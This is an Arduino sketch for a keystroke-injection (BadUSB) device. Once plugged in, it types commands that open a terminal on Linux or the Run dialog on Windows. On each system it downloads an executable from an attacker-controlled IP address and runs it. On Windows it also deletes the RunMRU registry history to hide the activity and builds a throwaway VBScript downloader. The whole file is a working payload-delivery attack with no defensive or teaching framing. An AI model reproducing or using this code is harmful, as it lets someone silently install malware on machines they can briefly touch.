void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('t');
  Keyboard.release(KEY_LEFT_CTRL);
  Keyboard.release(KEY_LEFT_ALT);
  delay(1000);
  Keyboard.println("rm x.out");
  delay(1000);
  Keyboard.println("wget http://127.0.0.1/x.out -O x.out");
  delay(1000);
  Keyboard.println("chmod +x x.out");
  Keyboard.println("./x.out &");
  delay(1000);
  Keyboard.println("exit");
  
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  delay(500); 
  Keyboard.println("echo Set xPost = CreateObject(\"Microsoft.XMLHTTP\") >webdown.vbs&echo xPost.Open \"GET\",\"http://192.168.1.102/x.exe\",0 >>webdown.vbs&echo xPost.Send() >>webdown.vbs&echo Set sGet = CreateObject(\"ADODB.Stream\") >>webdown.vbs&echo sGet.Mode = 3 >>webdown.vbs&echo sGet.Type = 1 >>webdown.vbs&echo sGet.Open() >>webdown.vbs&echo sGet.Write(xPost.responseBody) >>webdown.vbs&echo sGet.SaveToFile \"x.exe\",2 >>webdown.vbs&cscript webdown.vbs&del webdown.vbs /Q /F&x.exe&exit"); 
  Keyboard.end();
}
void loop() {
}
